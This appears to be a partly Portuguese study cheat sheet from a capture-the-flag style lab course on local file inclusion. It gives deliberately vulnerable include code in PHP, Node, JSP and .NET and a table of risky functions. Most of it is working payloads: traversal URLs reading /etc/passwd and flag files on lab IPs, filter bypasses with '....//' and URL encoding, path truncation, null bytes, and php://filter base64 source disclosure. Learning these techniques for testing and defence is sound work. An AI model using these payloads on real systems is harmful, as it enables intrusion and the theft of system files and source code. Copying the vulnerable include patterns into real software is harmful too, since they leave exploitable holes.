# Sample of code vulnerable to LFI

Code: php
if (isset($_GET['language'])) {
    include($_GET['language']);
}

# Outros parametros que podem ser vulneráveis

include_once(), require(), require_once(), file_get_contents()

# The following is a basic example of how a GET parameter language is used to control what data is written to a page:

if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}

# The following example shows uses the language parameter to determine which directory it should pull the about.html page from:

Code: js
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});

# The following examples show how web applications for a Java web server may include local files based on the specified parameter, using the include function:

Code: jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>

#  The import function may also be used to render a local file or a URL, such as the following example:

Code: jsp
<c:import url= "<%= request.getParameter('language') %>"/>

# The Response.WriteFile function works very similarly to all of our earlier examples, as it takes a file path for its input and writes its content to the response.
# The path may be retrieved from a GET parameter for dynamic content loading, as follows:

Code: cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}

# Furthermore, the @Html.Partial() function may also be used to render the specified file as part of the front-end template, similarly to what we saw earlier:

Code: cs
@Html.Partial(HttpContext.Request.Query['language'])

Code: cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->

# The following table shows which functions may execute files and which only read file content:

Function					Read 		Content		Execute	Remote URL
PHP			
include()/include_once()	✅			✅			✅
require()/require_once()	✅			✅			❌
file_get_contents()			✅			❌			✅
fopen()/file()				✅			❌			❌

NodeJS			
fs.readFile()				✅			❌			❌
fs.sendFile()				✅			❌			❌
res.render()                ✅			✅			❌

Java			
include						✅			❌			❌
import						✅			✅			✅

.NET			
@Html.Partial()				✅			❌			❌
@Html.RemotePartial()		✅			❌			✅
Response.WriteFile()		✅			❌			❌
include						✅			✅			✅

# Exemplos de LFI

http://94.237.55.163:47420/index.php?language=/../../../../../../usr/share/flags/flag.txt
http://94.237.55.163:47420/index.php?language=/../../../../etc/passwd

# Basic Bypasses
# Non-Recursive Path Traversal Filters

# We see that all ../ substrings were removed, which resulted in a final path being ./languages/etc/passwd. However, this filter is very insecure, as it is
# not recursively removing the ../ substring, as it runs a single time on the input string and does not apply the filter on the output string.
# For example, if we use ....// as our payload, then the filter would remove ../ and the output string would be ../, which means we may still perform path traversal. 

http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd

# Encoding

http://<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e

# Approved Paths

# Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path.
# For example, the web application we have been dealing with may only accept paths that are under the ./languages directory, as follows:

Code: php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}

# Exemplo de bypass

http://<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd

# Path Truncation

# An example of such payload would be the following:

Code: url
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]

# Path Truncation
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././

# Null Bytes

/etc/passwd%00
/etc/passwd%00.php

http://83.136.250.104:37680/index.php?language=languages/....//....//....//....//....//flag.txt

# PHP Filters
# Source Code Disclosure

Code: url
php://filter/read=convert.base64-encode/resource=config
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
http://83.136.253.251:32633/index.php?language=php://filter/read=convert.base64-encode/resource=configure

# As we can see, unlike our attempt with regular LFI, using the base64 filter returned an encoded string instead of the empty result we saw earlier.
# We can now decode this string to get the content of the source code of config.php, as follows:

echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}


